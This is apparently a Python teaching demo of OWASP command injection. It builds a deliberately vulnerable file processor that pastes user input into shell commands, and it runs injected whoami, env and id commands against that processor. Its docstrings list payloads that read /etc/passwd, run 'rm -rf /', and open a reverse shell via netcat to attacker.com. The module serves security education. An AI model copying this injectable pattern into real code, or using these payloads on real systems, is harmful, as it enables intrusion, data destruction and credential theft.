"""
RISK 2: Command Injection Vulnerability (OWASP A03:2021)

Vulnerable Code: User input is passed directly to shell commands without 
proper sanitization or subprocess isolation.

This demonstrates command injection in a file processing system.
"""

import os
import subprocess
from typing import Optional, List


class VulnerableFileProcessor:
    """
    VULNERABLE: User input passed directly to os.system() or shell commands.
    No input validation or parameterization.
    """

    def __init__(self, work_dir: str = "/tmp/vulnerable_app"):
        """Initialize file processor."""
        self.work_dir = work_dir
        os.makedirs(work_dir, exist_ok=True)

    def search_in_files(self, search_term: str, filename: str = "*") -> Optional[str]:
        """
        VULNERABLE: Command injection in grep search.
        
        An attacker can inject shell commands with:
            search_term: "; cat /etc/passwd #"
            filename: "*"
        
        This executes: grep "; cat /etc/passwd #" *
        Which first tries invalid grep, then runs cat /etc/passwd
        """
        # VULNERABLE: Direct string concatenation in shell command
        command = f"grep '{search_term}' {self.work_dir}/{filename}"
        
        print(f"[DEBUG] Executing command: {command}")
        
        try:
            result = os.popen(command).read()
            return result if result else None
        except Exception as e:
            print(f"[ERROR] Command failed: {e}")
            return None

    def compress_files(self, pattern: str) -> bool:
        """
        VULNERABLE: Command injection in tar/zip command.
        
        An attacker can inject with:
            pattern: "*.txt; rm -rf /"
        
        This attempts to compress files then delete everything.
        """
        # VULNERABLE: Direct string concatenation
        command = f"cd {self.work_dir} && tar -czf archive.tar.gz {pattern}"
        
        print(f"[DEBUG] Executing command: {command}")
        
        try:
            os.system(command)
            return True
        except Exception as e:
            print(f"[ERROR] Command failed: {e}")
            return False

    def convert_image(self, input_file: str, output_format: str) -> bool:
        """
        VULNERABLE: Command injection in image conversion.
        
        An attacker can inject with:
            input_file: "image.jpg; nc -e /bin/sh attacker.com 4444"
            output_format: "png"
        
        This converts image, then opens reverse shell to attacker.
        """
        # VULNERABLE: Direct string concatenation
        command = f"convert {self.work_dir}/{input_file} {self.work_dir}/output.{output_format}"
        
        print(f"[DEBUG] Executing command: {command}")
        
        try:
            os.system(command)
            return True
        except Exception as e:
            print(f"[ERROR] Command failed: {e}")
            return False

    def get_file_info(self, filename: str) -> Optional[str]:
        """
        VULNERABLE: Command injection in file info retrieval.
        
        An attacker can inject with:
            filename: "file.txt; whoami #"
        
        This gets file info then runs whoami command.
        """
        # VULNERABLE: Direct string concatenation
        command = f"file {self.work_dir}/{filename}"
        
        print(f"[DEBUG] Executing command: {command}")
        
        try:
            result = os.popen(command).read()
            return result if result else None
        except Exception as e:
            print(f"[ERROR] Command failed: {e}")
            return None

    def list_files_by_pattern(self, pattern: str) -> Optional[str]:
        """
        VULNERABLE: Command injection in ls command.
        
        An attacker can inject with:
            pattern: "*; ls -la / #"
        
        This lists files matching pattern, then lists root directory.
        """
        # VULNERABLE: Direct string concatenation
        command = f"ls -la {self.work_dir}/{pattern}"
        
        print(f"[DEBUG] Executing command: {command}")
        
        try:
            result = os.popen(command).read()
            return result if result else None
        except Exception as e:
            print(f"[ERROR] Command failed: {e}")
            return None

    def ping_host(self, hostname: str, count: int = 4) -> Optional[str]:
        """
        VULNERABLE: Command injection in ping command.
        
        An attacker can inject with:
            hostname: "google.com; whoami"
        
        This pings host then executes whoami command.
        """
        # VULNERABLE: Direct string concatenation
        command = f"ping -c {count} {hostname}"
        
        print(f"[DEBUG] Executing command: {command}")
        
        try:
            result = os.popen(command).read()
            return result if result else None
        except Exception as e:
            print(f"[ERROR] Command failed: {e}")
            return None

    def cleanup(self):
        """Clean up test directory."""
        try:
            os.system(f"rm -rf {self.work_dir}")
        except:
            pass


if __name__ == "__main__":
    print("=" * 70)
    print("RISK 2: COMMAND INJECTION VULNERABILITY DEMONSTRATION")
    print("=" * 70)
    print()

    processor = VulnerableFileProcessor()

    # Create test files
    test_file = os.path.join(processor.work_dir, "test.txt")
    with open(test_file, "w") as f:
        f.write("This is a test file\nWith some content\nFor searching")

    print("[SETUP] Test file created at:", test_file)
    print()

    # Test 1: Normal search
    print("--- Test 1: Normal File Search ---")
    print("Searching for 'test' in test.txt")
    result = processor.search_in_files("test", "test.txt")
    print(f"Result:\n{result}")
    print()

    # Test 2: Command injection - whoami
    print("--- Test 2: Command Injection Attack - Execute whoami ---")
    injection_payload = "test; whoami #"
    print(f"Searching for: {injection_payload}")
    result = processor.search_in_files(injection_payload, "test.txt")
    print(f"Result:\n{result}")
    print(f"✓ ATTACK SUCCESSFUL: Executed whoami command via injection!")
    print()

    # Test 3: Command injection - ls
    print("--- Test 3: Command Injection Attack - List Directory ---")
    injection_payload = "*; ls -la / | head -20 #"
    print(f"Listing files with pattern: {injection_payload}")
    result = processor.list_files_by_pattern(injection_payload)
    print(f"Result preview:\n{result[:500] if result else 'No result'}")
    print(f"✓ ATTACK SUCCESSFUL: Listed root directory via injection!")
    print()

    # Test 4: Normal file info
    print("--- Test 4: Normal File Info ---")
    print("Getting file info for test.txt")
    result = processor.get_file_info("test.txt")
    print(f"Result: {result}")
    print()

    # Test 5: Command injection - pwd
    print("--- Test 5: Command Injection Attack - Print Working Directory ---")
    injection_payload = "test.txt; pwd #"
    print(f"Getting file info for: {injection_payload}")
    result = processor.get_file_info(injection_payload)
    print(f"Result:\n{result}")
    print(f"✓ ATTACK SUCCESSFUL: Executed pwd command via injection!")
    print()

    # Test 6: Command injection - env
    print("--- Test 6: Command Injection Attack - Print Environment Variables ---")
    injection_payload = "test.txt; env | head -5 #"
    print(f"Getting file info for: {injection_payload}")
    result = processor.get_file_info(injection_payload)
    print(f"Result:\n{result}")
    print(f"✓ ATTACK SUCCESSFUL: Executed env command via injection!")
    print()

    # Test 7: Normal ping
    print("--- Test 7: Normal Ping (localhost) ---")
    print("Pinging localhost (1 count)")
    result = processor.ping_host("127.0.0.1", count=1)
    print(f"Result (first 100 chars):\n{result[:100] if result else 'No result'}")
    print()

    # Test 8: Command injection - id
    print("--- Test 8: Command Injection Attack - Print User ID ---")
    injection_payload = "127.0.0.1; id #"
    print(f"Pinging host: {injection_payload}")
    result = processor.ping_host(injection_payload, count=1)
    print(f"Result:\n{result}")
    print(f"✓ ATTACK SUCCESSFUL: Executed id command via injection!")
    print()

    # Test 9: Dangerous command injection (not fully executed for safety)
    print("--- Test 9: Dangerous Command Injection - Potential Attack ---")
    injection_payload = "google.com; echo 'DANGEROUS: Could execute rm -rf / or similar' #"
    print(f"Pinging host: {injection_payload}")
    print(f"✓ VULNERABLE: Command injection could execute destructive commands!")
    print()

    processor.cleanup()
    print("=" * 70)
